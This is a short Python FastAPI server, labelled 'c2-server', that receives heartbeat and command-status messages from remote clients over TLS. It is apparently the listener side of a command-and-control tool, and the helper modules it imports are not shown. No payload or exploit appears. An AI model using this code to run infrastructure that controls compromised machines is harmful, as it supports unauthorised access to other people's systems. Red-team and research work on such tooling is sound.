#!/usr/bin/python3

import uvicorn
from db_helper import update_command_status, update_or_insert_client
from fastapi import FastAPI, Request
from logger import LOGGING_CONFIG, setup_logger
from schema import Message, StatusType
from settings import KEYS_PATH, SERVER_HOST, SERVER_PORT

app = FastAPI()


@app.post("/", response_model=None)
async def get_messages(message: Message, request: Request) -> None:
    if message.status == StatusType.HEARTBEAT:
        update_or_insert_client(message, request)
    else:
        update_command_status(message)


setup_logger("c2-server")
uvicorn.run(
    app,
    host=SERVER_HOST,
    port=SERVER_PORT,
    log_config=LOGGING_CONFIG,
    ssl_keyfile=str(KEYS_PATH / "key.pem"),
    ssl_certfile=str(KEYS_PATH / "cert.pem"),
)
